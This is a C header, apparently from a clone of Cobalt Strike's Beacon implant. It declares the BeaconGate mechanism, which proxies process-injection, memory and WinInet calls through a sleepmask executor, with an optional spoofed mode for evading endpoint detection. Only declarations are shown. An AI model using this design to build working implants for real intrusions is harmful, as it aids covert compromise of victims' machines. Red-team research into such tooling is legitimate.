/* beacon_gate.h - BeaconGate (4.10 parity) */
#pragma once

#include <windows.h>

/* FUNCTION_CALL is the contract a user sleepmask BOF receives (arsenal-kit
 * kits/sleepmask/src/beacon_gate.h): Beacon packs one Win32 call and hands
 * it to the executor. Keep the field order, the 10-argument array and the
 * WinApi enum below byte-compatible with the kit - a kit-compiled sleepmask
 * switches on `function` (e.g. EXITTHREAD runs its cleanup first). */
enum {
	GATE_API_INTERNETOPENA = 0,
	GATE_API_INTERNETCONNECTA,
	GATE_API_VIRTUALALLOC,
	GATE_API_VIRTUALALLOCEX,
	GATE_API_VIRTUALPROTECT,
	GATE_API_VIRTUALPROTECTEX,
	GATE_API_VIRTUALFREE,
	GATE_API_GETTHREADCONTEXT,
	GATE_API_SETTHREADCONTEXT,
	GATE_API_RESUMETHREAD,
	GATE_API_CREATETHREAD,
	GATE_API_CREATEREMOTETHREAD,
	GATE_API_OPENPROCESS,
	GATE_API_OPENTHREAD,
	GATE_API_CLOSEHANDLE,
	GATE_API_CREATEFILEMAPPINGA,
	GATE_API_MAPVIEWOFFILE,
	GATE_API_UNMAPVIEWOFFILE,
	GATE_API_VIRTUALQUERY,
	GATE_API_DUPLICATEHANDLE,
	GATE_API_READPROCESSMEMORY,
	GATE_API_WRITEPROCESSMEMORY,
	GATE_API_EXITTHREAD,
	GATE_API_COUNT
};

/* setting 96 = per-API bitmask, one bit per enum value; 97 = mode flags.
 * The TS builds the same value (BeaconPayload.setupBeaconGate). */
#define GATE_BIT(api)            (1u << (api))
#define GATE_MODE_ALL            (1u << 0)
/* GATE_MODE_SPOOF (bit1): opt-in switch for the spoofed executor. */
#define GATE_MODE_SPOOF          (1u << 1)

#define MAX_BEACON_GATE_ARGUMENTS 10

typedef struct _FUNCTION_CALL {
	void *              functionPtr;
	int                 function;    /* GATE_API_* enum value */
	int                 numOfArgs;
	unsigned long long  args[MAX_BEACON_GATE_ARGUMENTS];
	BOOL                bMask;
	unsigned long long  retValue;
} FUNCTION_CALL, *PFUNCTION_CALL;

int  gate_enabled(void);
int  gate_api_enabled(int api);
unsigned long long gate_dispatch(FUNCTION_CALL * fc);

/* pack one call and hand it to the executor. Every argument is cast to
 * unsigned long long by the caller: a 32-bit value passed to `...` is only
 * guaranteed in the low half of its slot. x86: plain dispatch. */
unsigned long long gate_call(void * fn, int api, int n, ...);

/* Win32-shaped and gate-aware: proxied through the executor when the gate
 * is on for that API, otherwise the plain API call. The call sites that
 * used to call the raw API call these instead, so nothing changes for a
 * profile without a beacon_gate block. (InternetOpenA / InternetConnectA
 * live in channel.cpp - the WinInet build.) */
LPVOID   gate_VirtualAlloc(LPVOID addr, SIZE_T size, DWORD type, DWORD protect);
LPVOID   gate_VirtualAllocEx(HANDLE proc, LPVOID addr, SIZE_T size, DWORD type, DWORD protect);
BOOL     gate_VirtualProtect(LPVOID addr, SIZE_T size, DWORD protect, PDWORD old);
BOOL     gate_VirtualProtectEx(HANDLE proc, LPVOID addr, SIZE_T size, DWORD protect, PDWORD old);
BOOL     gate_VirtualFree(LPVOID addr, SIZE_T size, DWORD freetype);
BOOL     gate_GetThreadContext(HANDLE thread, CONTEXT * ctx);
BOOL     gate_SetThreadContext(HANDLE thread, CONTEXT * ctx);
DWORD    gate_ResumeThread(HANDLE thread);
HANDLE   gate_CreateThread(LPSECURITY_ATTRIBUTES sa, SIZE_T stack, LPTHREAD_START_ROUTINE start, LPVOID param, DWORD flags, LPDWORD id);
HANDLE   gate_CreateRemoteThread(HANDLE proc, LPSECURITY_ATTRIBUTES sa, SIZE_T stack, LPTHREAD_START_ROUTINE start, LPVOID param, DWORD flags, LPDWORD id);
HANDLE   gate_OpenProcess(DWORD access, BOOL inherit, DWORD pid);
HANDLE   gate_OpenThread(DWORD access, BOOL inherit, DWORD tid);
BOOL     gate_CloseHandle(HANDLE h);
HANDLE   gate_CreateFileMappingA(HANDLE file, LPSECURITY_ATTRIBUTES sa, DWORD protect, DWORD high, DWORD low, const char * name);
LPVOID   gate_MapViewOfFile(HANDLE map, DWORD access, DWORD high, DWORD low, SIZE_T size);
BOOL     gate_UnmapViewOfFile(LPCVOID base);
SIZE_T   gate_VirtualQuery(LPCVOID addr, PMEMORY_BASIC_INFORMATION mbi, SIZE_T len);
BOOL     gate_DuplicateHandle(HANDLE sp, HANDLE sh, HANDLE tp, LPHANDLE th, DWORD access, BOOL inherit, DWORD options);
BOOL     gate_ReadProcessMemory(HANDLE proc, LPCVOID base, LPVOID buf, SIZE_T n, SIZE_T * read);
BOOL     gate_WriteProcessMemory(HANDLE proc, LPVOID base, LPCVOID buf, SIZE_T n, SIZE_T * written);
void     gate_ExitThread(DWORD exitcode);

/* BOF API: BeaconDisableBeaconGate / BeaconEnableBeaconGate /
 * BeaconDisableBeaconGateMasking / BeaconEnableBeaconGateMasking */
void BeaconDisableBeaconGate(void);
void BeaconEnableBeaconGate(void);
void BeaconDisableBeaconGateMasking(void);
void BeaconEnableBeaconGateMasking(void);

/* The exit path releases the settings table before it reaches the gate
 * (safe_exit: track_memory_cleanup first): call this while the settings
 * exist and the gate decides from the snapshot from then on. */
void gate_exit_snapshot(void);

/* a user sleepmask BOF takes every gated call (and the sleep itself):
 * gate_set_executor installs it, NULL selects the built-in executor.
 * It answers TRUE when it ran the call. FALSE hands the call back and
 * the built-in executors take it - an object that failed to load must
 * not cost Beacon the API call it was going to make */
typedef BOOL (*GATE_EXECUTOR)(FUNCTION_CALL * fc);
void gate_set_executor(GATE_EXECUTOR executor);
